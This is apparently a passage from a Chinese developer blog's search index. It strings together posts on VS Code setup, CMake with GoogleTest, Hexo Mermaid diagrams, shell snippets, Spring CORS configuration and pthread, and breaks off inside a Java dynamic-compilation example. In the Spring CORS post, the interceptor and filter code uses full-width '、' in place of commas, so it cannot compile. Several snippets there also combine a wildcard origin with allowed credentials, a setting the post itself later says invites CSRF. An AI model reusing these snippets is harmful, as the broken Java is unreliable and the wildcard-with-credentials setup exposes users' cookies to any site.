VS Code，此安装方式适用于 RHEL 系、Debian 系、 openSUSE 系等大多数主流的 Linux 发行版，Snap 的安装和使用可参考 本站教程。VS Code 成功安装后，Snap 的守护进程将负责在后台自动更新 VS Code，每当有新的更新可用时，都会自动下载并安装最新版本的 VS Code。 12345$ sudo snap install --classic code或者$ sudo snap install --classic code-insiders VS Code 设置字体 下载字体 12$ cd /usr/share/fonts/truetype/$ git clone https://github.com/abertsch/Menlo-for-Powerline.git 刷新字体 1$ fc-cache -f -v 设置字体 或者编辑 VS Code 的 setting.json 配置文件，在其中加入以下配置内容： 1"editor.fontFamily": "\'Menlo for Powerline\'" 重启 VS Code，让字体更改生效 VS Code 版本更新VS Code 每月发布一次，可以通过查看发行日志了解何时有新版本可用。如果 VS Code 软件仓库源安装正确，那么 VS Code 应该会与系统上的其他软件包以相同的方式自动更新。值得一提的是，由于受限于手动签名过程和官方用于发布的系统，yum repo 可能会滞后并且无法立即获取到最新版本的 VS Code。 参考资料 Linux 安装 VS Code 官方教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 开发工具"},{title:"JQuery 常用代码块",url:"/posts/b4df07d2.html",text:'选择器删除节点的所有属性1234567891011jQuery.fn.removeAttributes = function() { return this.each(function() { var attributes = $.map(this.attributes, function(item) { return item.name; }); var img = $(this); $.each(attributes, function(i, item) { img.removeAttr(item); }); });} 例如删除 &lt;img&gt; 节点的所有属性，使用示例如下： 1$("img").removeAttributes(); var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"前端"},{title:"C++ 开发随笔",url:"/posts/4ca3ab6c.html",text:'构建工具CMake 无法引入第三方库的头文件这里以 GoogleTest 库为例子，讲述 CMake 为什么无法正常引入项目里的第三方库的头文件，其中 GoogleTest 库在项目里的目录结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869minder├── CMakeLists.txt├── include├── src└── thirdparty └── googletest ├── gmock │ ├── include │ │ └── gmock │ │ ├── gmock-actions.h │ │ ├── gmock-cardinalities.h │ │ ├── gmock-function-mocker.h │ │ ├── gmock-generated-actions.h │ │ ├── gmock-generated-actions.h.pump │ │ ├── gmock-generated-function-mockers.h │ │ ├── gmock-generated-function-mockers.h.pump │ │ ├── gmock-generated-matchers.h │ │ ├── gmock-generated-matchers.h.pump │ │ ├── gmock.h │ │ ├── gmock-matchers.h │ │ ├── gmock-more-actions.h │ │ ├── gmock-more-matchers.h │ │ ├── gmock-nice-strict.h │ │ ├── gmock-spec-builders.h │ │ └── internal │ │ ├── custom │ │ │ ├── gmock-generated-actions.h │ │ │ ├── gmock-generated-actions.h.pump │ │ │ ├── gmock-matchers.h │ │ │ ├── gmock-port.h │ │ │ └── README.md │ │ ├── gmock-internal-utils.h │ │ ├── gmock-port.h │ │ └── gmock-pp.h │ └── lib │ ├── libgmock_main.so │ └── libgmock.so └── gtest ├── include │ └── gtest │ ├── gtest-death-test.h │ ├── gtest.h │ ├── gtest-matchers.h │ ├── gtest-message.h │ ├── gtest-param-test.h │ ├── gtest_pred_impl.h │ ├── gtest-printers.h │ ├── gtest_prod.h │ ├── gtest-spi.h │ ├── gtest-test-part.h │ ├── gtest-typed-test.h │ └── internal │ ├── custom │ │ ├── gtest.h │ │ ├── gtest-port.h │ │ ├── gtest-printers.h │ │ └── README.md │ ├── gtest-death-test-internal.h │ ├── gtest-filepath.h │ ├── gtest-internal.h │ ├── gtest-param-util.h │ ├── gtest-port-arch.h │ ├── gtest-port.h │ ├── gtest-string.h │ ├── gtest-type-util.h │ └── gtest-type-util.h.pump └── lib ├── libgtest_main.so └── libgtest.so 特别注意 在上面的项目结构中，gtest 的头文件所在的目录是 thirdparty/googletest/gtest/include/gtest/，而不是 thirdparty/googletest/gtest/include/。因此在 C++ 源文件中引入 gtest 头文件的正确写法是 #include &lt;gtest/gtest.h&gt;，即头文件的路径是 include 目录下的 gtest/gtest.h。这一点必须注意，否则会经常导致 CMake 无法正常引入第三方库的头文件。简单一句话概况，如果在 C++ 源文件中，头文件的引入方式是 #include &lt;gtest/gtest.h&gt;，那么在项目里的第三方库的 include 目录下必然要有一个 gtest 子目录。 C++ 的示例代码 1234567891011121314#include &lt;iostream&gt;#include &lt;gtest/gtest.h&gt;using namespace std;TEST( COutputPopLimitStrategyTest, PositiveNos ){ EXPECT_EQ(true, true);}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} CMake 的示例配置 123456789101112131415# 定义 GoogleTest 库的目录路径set(PATH_TO_GOOGLE_TEST thirdparty/googletest/gtest)set(PATH_TO_GOOGLE_MOCK thirdparty/googletest/gmock)# 引入 GoogleTest 库的头文件include_directories(${PATH_TO_GOOGLE_TEST}/include ${PATH_TO_GOOGLE_MOCK}/include)# 指定 GoogleTest 动态链接库所在的目录link_directories(${PATH_TO_GOOGLE_TEST}/lib ${PATH_TO_GOOGLE_MOCK}/lib)# 指定编译参数set(CMAKE_CXX_FLAGS "-lpthread")# 链接 GoogleTest 的动态链接库target_link_libraries(${PROJECT_NAME} gtest_main.so gtest.so gmock_main.so gmock.so) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ 开发随笔"},{title:"Hexo NexT 主题渲染 Mermaid 绘图",url:"/posts/e6e0cad5.html",text:'版本说明 Hexo 5.4.0 NexT 8.8.1 NexT 渲染 Mermaid 绘图安装 Hexo 插件在博客的根目录下，执行以下命令安装 hexo-filter-mermaid-diagrams 插件 1$ npm install hexo-filter-mermaid-diagrams --save NexT 启用 Mermaid打开 NexT 主题的 _config.yml 配置文件，找到 mermaid 的配置项，并设置 enable: true，如下所示： 1234567# Mermaid tagmermaid: enable: true # Available themes: default | dark | forest | neutral theme: light: default dark: dark Hexo 重新编译构建执行以下命令，重新执行 Hexo 的编译构建操作，并启动 Hexo-Server 的预览服务，若 Mermaid 的绘图正常显示，则说明 Mermaid 成功被渲染。 1$ hexo clean &amp;&amp; hexo generate &amp;&amp; hexo server Hexo 插件的使用Hexo 插件 hexo-filter-mermaid-diagrams 的官方文档说明可以看这里。 语法说明值得一提的是，有一些 Markdown 的编辑工具，比如在 Cmd Markdown 里，Mermaid 的使用语法是这样的： 但 hexo-filter-mermaid-diagrams 这款插件的使用语法略有不同： sequence、graph TD 等 Mermaid Diagram 的具体类型必须写在第一行的内容里 三个点后面要写的是 mermaid，而不是 sequence、graph TD 等 Mermaid Diagram 的具体类型 使用示例流程图1234567graph TB id1(圆角矩形)--普通线--&gt;id2[矩形]; subgraph 子图 id2==粗线==&gt;id3{菱形} id3-.虚线.-&gt;id4&gt;右向旗帜] id3--无箭头---id5((圆形)) end graph TB id1(圆角矩形)--普通线--&gt;id2[矩形]; subgraph 子图 id2==粗线==&gt;id3{菱形} id3-.虚线.-&gt;id4&gt;右向旗帜] id3--无箭头---id5((圆形)) end 时序图12345678910sequenceDiagramAlice-&gt;&gt;John: Hello John, how are you?loop Healthcheck John-&gt;&gt;John: Fight against hypochondriaendNote right of John: Rational thoughts! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob : How about you? Bob--&gt;&gt;John : Jolly good! sequenceDiagram Alice-&gt;&gt;John: Hello John, how are you? loop Healthcheck John-&gt;&gt;John: Fight against hypochondria end Note right of John: Rational thoughts! John--&gt;&gt;Alice: Great! John-&gt;&gt;Bob : How about you? Bob--&gt;&gt;John : Jolly good! 甘特图12345678ganttsection Section Completed: done, des1, 2014-01-06, 2014-01-08 Active : active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d gantt section Section Completed: done, des1, 2014-01-06, 2014-01-08 Active : active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d 饼图123456pie title Key elements in Product X "Calcium" : 42.96 "Potassium" : 50.05 "Magnesium" : 10.01 "Iron" : 5 pie title Key elements in Product X "Calcium" : 42.96 "Potassium" : 50.05 "Magnesium" : 10.01 "Iron" : 5 类别图123456789101112131415161718192021classDiagram Animal &lt;|-- Duck Animal &lt;|-- Fish Animal &lt;|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() } classDiagram Animal &lt;|-- Duck Animal &lt;|-- Fish Animal &lt;|-- Zebra Animal : +int age Animal : +String gender Animal: +isMammal() Animal: +mate() class Duck{ +String beakColor +swim() +quack() } class Fish{ -int sizeInFeet -canEat() } class Zebra{ +bool is_wild +run() } 状态图12345678910111213141516stateDiagram [*]--&gt;Active state Active { [*]--&gt;NumLockOff NumLockOff--&gt;NumLockOn : EvNumLockPressed NumLockOn--&gt;NumLockOff : EvNumLockPressed -- [*]--&gt;CapsLockOff CapsLockOff--&gt;CapsLockOn : EvCapsLockPressed CapsLockOn--&gt;CapsLockOff : EvCapsLockPressed -- [*]--&gt;ScrollLockOff ScrollLockOff--&gt;ScrollLockOn : EvCapsLockPressed ScrollLockOn--&gt;ScrollLockOff : EvCapsLockPressed } stateDiagram [*]--&gt;Active state Active { [*]--&gt;NumLockOff NumLockOff--&gt;NumLockOn : EvNumLockPressed NumLockOn--&gt;NumLockOff : EvNumLockPressed -- [*]--&gt;CapsLockOff CapsLockOff--&gt;CapsLockOn : EvCapsLockPressed CapsLockOn--&gt;CapsLockOff : EvCapsLockPressed -- [*]--&gt;ScrollLockOff ScrollLockOff--&gt;ScrollLockOn : EvCapsLockPressed ScrollLockOn--&gt;ScrollLockOff : EvCapsLockPressed } 实体关系图1234erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses 参考资料 mermaid-js 官方文档 hexo-filter-mermaid-diagrams 插件的官方文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客"},{title:"Shell 编程常用代码块之一",url:"/posts/d9ceba01.html",text:'日志定义日志的颜色123456789101112131415161718192021222324252627282930313233#!/bin/bash_COLORS=${BS_COLORS:-$(tput colors 2&gt;/dev/null || echo 0)}__detect_color_support() { if [ $? -eq 0 ] &amp;&amp; [ "$_COLORS" -gt 2 ]; then RC=\'\\033[1;31m\' GC=\'\\033[1;32m\' BC=\'\\033[1;34m\' YC=\'\\033[1;33m\' EC=\'\\033[0m\' else RC="" GC="" BC="" YC="" EC="" fi}__detect_color_supportechoerror() { printf "${RC} * ERROR${EC}: %s\\\\n" "$@" 1&gt;&amp;2;}echoinfo() { printf "${GC} * INFO${EC}: %s\\\\n" "$@";}echowarn() { printf "${YC} * WARN${EC}: %s\\\\n" "$@";}# 使用示例echoinfo "Hello World"echowarn "Hello World"echoerror "Hello World" 常见的条件判断判断目录是否存在123456789#!/bin/bashLOGS_PATH="/tmp/logs/blog"if [ ! -d "$LOGS_PATH" ]; then echo "目录不存在"else echo "目录已存在"fi 判断操作系统类型1234567891011#!/bin/bash_OS_LINUX="Linux"_OS_INFO=`uname -a`if [[ $_OS_INFO =~ $_OS_LINUX ]]then echo "Linux 操作系统"else echo "非 Linux 操作系统"fi 判断是否为 Root 用户12345#!/bin/bashif [ $UID -ne 0 ]; then echo "非 Root 用户!"fi 执行脚本执行指定的 Shell 脚本文件使用 Linux 命令，执行指定的 Shell 脚本文件 1sh date.sh 执行指定的 Shell 脚本内容使用 Linux 命令，执行指定的 Shell 脚本内容 1sh -c "echo 现在的时间：`date \'+%Y-%m-%d %H:%M:%S\'`" 获取 Linux 命令的执行结果1234#!/bin/bashdate_str=$(date)echo $date_str 执行字符串里的 Shell 脚本内容1234#!/bin/bashUPDATE_SYSTEM_DYNAMIC_LIBS=0echo "### 是否更新系统的动态链接库: `[[ $UPDATE_SYSTEM_DYNAMIC_LIBS -eq 1 ]] &amp;&amp; echo \'是\' || echo \'否\'`" 程序运行状态获取应用的进程数12345678#!/bin/bash# 应用的名称program_name="dockerd"# 精确统计应用正在运行的进程数量count=`ps -aux | grep -w "$program_name" | grep -v grep | wc -l`echo $count 获取应用的进程 ID12345678910111213141516#!/bin/bash# 应用的名称program_name="dockerd"# 精确获取应用正在运行的进程ID（应用同时运行了多个实例时，会有多个值，返回数组）process_ids=`ps -aux | grep -w "$program_name" | grep -v grep | awk \'{print $2}\'`# 判断进程ID是否为空if [ ! -n "$process_ids" ]; then echo "$program_name 没有运行"else # 数组转字符串 process_ids_str=`echo $process_ids` echo "$program_name 已经有实例正在运行，PID 是 ${process_ids_str/ /, }" fi 日期处理判断是否为周末1234567#!/bin/bashif [[ $(date +%u) -gt 5 ]]; then echo "今天是周末"else echo "今天不是周末"fi 判断今天是星期几12345#!/bin/bash# 值的范围是1 ~ 7，其中 1 表示星期一DOW=$(date +%u)echo $DOW var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux系统编程 代码块"},{title:"Spring 与 SpringBoot 配置跨域的几种方式",url:"/posts/3a3d508.html",text:'前言 什么是跨域：浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一项不同，都属于跨域 造成的原因：由于浏览器的同源策略，即 A 网站只能访问 A 网站的内容，不能访问 B 网站的内容 特别注意：跨域问题只存在于浏览器，也就是说当前端页面访问后端的接口时，返回值是有的，只是服务器没有在请求头指定跨域的信息，所以浏览器自动把返回值给” 屏蔽了” 解决跨域：经过上面的了解，可以得出几个解决跨域的方法（这里暂不考虑前端的实现方案），一是服务端指定跨域信息，二是在 Web 页面与后端服务之间加一层服务来指定跨域信息，比如代理服务 Nginx Spring 配置跨域使用注解实现跨域 特别注意：Spring 的版本要在 4.2 或以上版本才支持使用 @CrossOrigin 注解来控制跨域，使用注解的方式优势在于比较容易细粒度（局部）地实现跨域控制 在 Controller 类中配置跨域，可以使用注解 @CrossOrigin，该注解支持写在类或者方法上，示例代码如下： 1234567891011@RestController@RequestMapping("/account")public class AccountController { @CrossOrigin @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} 或者 1234567891011121314import org.springframework.web.bind.annotation.*;import static org.springframework.web.bind.annotation.RequestMethod.*;@RestController@RequestMapping("/account")@CrossOrigin(origins = {"http://example.com"}, maxAge = 3600, allowedHeaders = {"Origin", "X-Requested-With", "Content-Type", "Accept", "token"}, methods = {GET, POST, PUT, OPTIONS, DELETE, PATCH})public class AccountController { @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} @CrossOrigin 注解中的参数说明如下： origins：允许来源域名的列表，不设置确切值时默认支持所有域名跨域访问 methods: 跨域请求中支持的 HTTP 请求的类型（GET、POST、DELETE …），不指定确切值时默认与 Controller 方法中的 methods 字段保持一致 maxAge：跨域预检请求的有效期（单位为秒），目的是减少浏览器预检 / 响应的请求数量，默认值是 1800秒；设置了该值后，浏览器将在设置值的时间段内对该跨域请求不再发起预检请求 exposedHeaders：跨域请求的请求头中允许携带除 Cache-Controller、Content-Language、Content-Type、Expires、Last-Modified、Pragma 这六个基本字段之外的其他字段信息 allowedHeaders：允许的请求头中的字段类型，不设置确切值时默认支持所有的 Header 字段（Cache-Controller、Content-Language、Content-Type、Expires、Last-Modified、Pragma）跨域访问 allowCredentials：浏览器是否将本域名下的 Cookie 信息携带至跨域服务器中，若设置为携带 Cookie 至跨域服务器中，要实现 Cookie 共享还需要前端在 AJAX 请求中打开 withCredentials 属性 SpringMVC 还支持同时使用类和方法级别的跨域配置，此时 SpringMVC 会合并两个注解属性以创建合并后的跨域配置 123456789101112@RestController@RequestMapping("/account")@CrossOrigin(maxAge = 3600)public class AccountController { @CrossOrigin(origins = {"http://example.com"}) @GetMapping("/{id}") public Account retrieve(@PathVariable Long id) { }} 如果在 Spring 项目里使用了 Spring Security，请确保 Spring Security 在安全级别启用 CORS，并允许它利用 Spring MVC 级别的配置定义 123456789@Configuration@EnableWebSecuritypublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.cors().and()... }} 使用拦截器实现跨域123456789101112131415161718192021222324252627282930313233343536373839import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;@Configurationpublic class WebMvcConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new HandlerInterceptor() { @Override public boolean preHandle(HttpServletRequest request、HttpServletResponse response、Object handler) throws Exception { response.addHeader("Access-Control-Allow-Origin"、"*"); response.setHeader("Access-Control-Allow-Credentials"、"true"); response.addHeader("Access-Control-Allow-Methods"、"GET、POST、PUT、DELETE、OPTIONS"); response.addHeader("Access-Control-Allow-Headers"、"Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,token"); return true; } @Override public void postHandle(HttpServletRequest request、HttpServletResponse response、Object handler、ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request、HttpServletResponse response、Object handler、Exception ex) throws Exception { } }); }} 由于请求头中自定义的字段是不允许跨域的，所以需要指定允许跨域的自定义 Header，上述的代码段如下： 1response.addHeader("Access-Control-Allow-Headers"、"Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,token"); 使用过滤器实现跨域123456789101112131415161718192021222324252627282930313233343536373839404142434445import org.springframework.stereotype.Component;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.IOException;@Component@WebFilter(urlPatterns = {"/*"}、filterName = "corsFilter")public class CorsFilter implements Filter { @Override public void doFilter(ServletRequest request、ServletResponse response、FilterChain chain) throws IOException、ServletException { HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse rep = (HttpServletResponse) response; HttpSession session = req.getSession(); // 设置允许跨域的来源域名 rep.setHeader("Access-Control-Allow-Origin"、"*"); // 设置允许跨域请求中支持的HTTP请求类型 rep.setHeader("Access-Control-Allow-Methods"、"POST、GET、PUT、OPTIONS、DELETE、PATCH"); // 设置跨域预检请求的有效期（秒） rep.setHeader("Access-Control-Max-Age"、"3600"); // 设置允许跨域的请求头字段 rep.setHeader("Access-Control-Allow-Headers"、"token、Origin、X-Requested-With、Content-Type、Accept"); // 设置允许将本站域名下的Cookie信息携带至跨域服务器 rep.setHeader("Access-Control-Allow-Credentials"、"true"); // 将获取到的SessionId通过Cookie返回给前端 // rep.addCookie(new Cookie("JSSESIONID"、session.getId())); chain.doFilter(req、rep); } @Override public void init(FilterConfig arg0) throws ServletException { } @Override public void destroy() { }} (adsbygoogle = window.adsbygoogle || []).push({}); SpringBoot 配置跨域 特别注意：上述介绍的 Spring 使用注解、拦截器、过滤器控制跨域的方式，同样适用于 SpringBoot 项目 SpringBoot 1.5 版本在 SpringBoot 1.5 版本里，可以继承 WebMvcConfigurerAdapter 类并实现 addCorsMappings() 抽象方法 1234567891011@Configurationpublic class WebMvcConfig extends WebMvcConfigurerAdapter { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping("/**").allowedHeaders("*") .allowedMethods("*") .allowedOrigins("*") .allowCredentials(true); }} SpringBoot 2.0 版本在 SpringBoot 2.0 版本里，可以实现 WebMvcConfigurer 接口并实现 addCorsMappings() 方法 1234567891011121314151617import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebMvcConfig implements WebMvcConfigurer { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping("/**") .allowedHeaders("Content-Type"、"X-Requested-With"、"accept,Origin"、"Access-Control-Request-Method"、"Access-Control-Request-Headers"、"token") .allowedMethods("*") .allowedOrigins("*") .allowCredentials(true); }} 扩展说明Nginx 配置跨域 Nginx 配置跨域 Access-Control-Max-Age 参数浏览器的同源策略，就是出于安全考虑，浏览器会限制从脚本发起的跨域 HTTP 请求（比如异步请求 GET、POST、PUT、DELETE、OPTIONS 等等），所以浏览器会向所请求的服务器发起两次请求；第一次是浏览器使用 OPTIONS 方法发起一个预检请求，第二次才是真正的请求；第一次的预检请求获知服务器是否允许该跨域请求：如果允许，才发起第二次真实的请求；如果不允许，则拦截第二次请求。Access-Control-Max-Age:3600（单位为秒，有效期为 1 小时）表示该预检请求在客户端 1 小时后过期，即 1 小时内发送普通请求就不会再伴随着发送预检请求，这样可以减少对服务器的压力，但是时间也不宜设置太大，尤其是项目频繁发布版本的阶段，同时又修改了 Cors 配置的场景。 resp.addHeader("Access-Control-Max-Age", "0")：表示每次请求都发起预检请求，也就是说每次都发送两次请求 resp.addHeader("Access-Control-Max-Age", "1800")：表示每隔 30 分钟才发起一次预检请求 Access-Control-Allow-Credentials 参数如果服务器端设置了 Access-Control-Allow-Credentials: true，同时服务器端还设置了 Access-Control-Allow-Origin: *，那就意味将 Cookie 暴露给了所有的网站。举个例子，假设当前是 A 网站，并且在 Cookie 里写入了身份凭证，用户同时打开了 B 网站，那么 B 网站给 A 网站的服务器发的所有请求都是以 A 用户的身份进行的，这将导致 CSRF 系统安全问题。 常见问题@CrossOrigin 注解不生效 1.Spring 的版本要在 4.2 或以上版本才支持 @CrossOrigin 注解 2. 并非 @CrossOrigin 没有解决跨域的问题，而是不正确的请求导致无法得到预期的响应，最终使浏览器端提示跨域错误，此时建议检查 HTTP 请求的响应状态码 3. 在 Controller 类上方添加 @CrossOrigin 注解后，仍然出现跨域问题，解决方案之一就是在方法上的 @RequestMapping 注解中指定 GET、POST 等方式，示例代码如下： 123456789@CrossOrigin@RestControllerpublic class AccountController { @RequestMapping(method = RequestMethod.GET) public String add() { }} 注解方式与过滤器方式的适用场景过滤器 / 拦截器方式适合于大范围的跨域控制，比如某个 Controller 类的所有方法全部支持某个或几个具体的域名跨域访问的场景。而注解方式的优势在于细粒度的跨域控制，比如一个 Controller 类中 methodA 支持域名 originA 跨域访问，methodB 支持域名 originB 跨域访问的情况，当然过滤器 / 拦截器方式也能实现，但适用注解的方式能轻松很多，尤其是上述情况比较多的场景。值得一提的是，@CrossOrigin 注解的底层代码并不是基于拦截器或者过滤器来实现的。 参考博客 Spring 官方文档 @CrossOrigin 注解解决跨域问题 CORS 与 @CrossOrigin 注解底层实现详解 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Linux 系统编程之四 C++ 多线程",url:"/posts/841eca80.html",text:'查看 pthread.h 的位置在 Linux 系统里，pthread.h 头文件的位置一般是 /usr/include/pthread.h，可以通过以下命令查看头文件的位置 1# whereis pthread.h 基于 pthread 多线程编程案例代码123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;using namespace std;void printids(const char *s) { pid_t pid = getpid(); pthread_t tid = pthread_self(); printf("%s pid %u tid %u (0x%x)\\n", s, (unsigned int) pid, (unsigned int) tid, (unsigned int) tid);}void *thr_fn(void *args) { printids("new thread: "); return ((void *) 0);}int main() { pthread_t ntid; int err = pthread_create(&amp;ntid, NULL, thr_fn, NULL); if (err != 0) { printf("can\'t create thread: %d\\n", err); exit(1); } printids("main thread: "); sleep(1); return 0;} 编译代码由于 pthread 不是 Linux 系统默认的库，因此链接时需要使用静态库 libpthread.a。简而言之，在使用 pthread_create() 创建线程，以及调用 pthread_atfork() 函数建立 fork 处理程序时，需要通过 -lpthread 参数链接该库，同时还需要在 C++ 源文件里添加头文件 pthread.h。 提示 为了可以正常编译使用了 pthread 的项目代码，不同构建工具的使用说明如下： 若使用 G++ 编译 C++ 项目，则编译命令的示例如下： 12# 编译代码$ g++ main.cpp -o main -lpthread 若使用 CMake 构建 C++ 项目，则 CMakeLists.txt 配置文件的示例内容如下： 123set(CMAKE_CXX_FLAGS "-std=c++11 -lpthread")add_executable(main main.cpp) 程序运行输出的结果如下： 12main thread: pid 6189 tid 342021952 (0x1462d740)new thread: pid 6189 tid 324765440 (0x135b8700) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ linux系统编程"},{title:"Java 动态编译的实现",url:"/posts/b8943243.html",text:'前言本文主要介绍如何实现 Java 的动态编译，并给出快速入门案例，点击下载完整的案例代码。 快速入门编写接口12345678910package com.clay.domain;/** * @author clay */public interface Store { public void sell();} 12345678910111213package com.clay.domain;/** * @author clay */public class Supermarket implements Store { @Override public void sell() { System.out.println("invoke supermarket sell method"); }} 编写工具类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package com.clay.loader;import javax.tools.JavaCompiler;import javax.tools.JavaFileObject;import javax.tools.StandardJavaFileManager;import javax.tools.ToolProvider;import java.io.IOException;import java.net.URL;import java.net.URLClassLoader;import java.util.*;/** * 动态加载器 * * @author clay */public class DynamicLoader { /** * 编译参数 */ private List&lt;String&gt; options = new ArrayList&lt;&gt;(); /** * 添加编译参数 * * @param key * @param value * @throws NullPointerException */ public void addOption(String key, String value) throws NullPointerException { if (key == null || key.isEmpty()) { throw new NullPointerException("Option key is empty"); } options.add(key); options.add(value); } /** * 通过Java文件名和其代码，编译得到字节码，返回类名及其对应类的字节码，封装于Map中， * 值得注意的是，平常类中就编译出来的字节码只有一个类，但是考虑到内部类的情况， 会出现很多个类名及其字节码，所以用Map封装方便 * * @param javaName Java文件名，例如Student.java * @param javaCode Java源码 * @return map */ public Map&lt;String, byte[]&gt; compile(String javaName, String javaCode) { JavaCompiler compiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager stdManager = compiler.getStandardFileManager(null, null, null); try (MemoryJavaFileManager manager = new MemoryJavaFileManager(stdManager)) { JavaFileObject javaFileObject = manager.makeStringSource(javaName, javaCode); JavaCompiler.CompilationTask task = 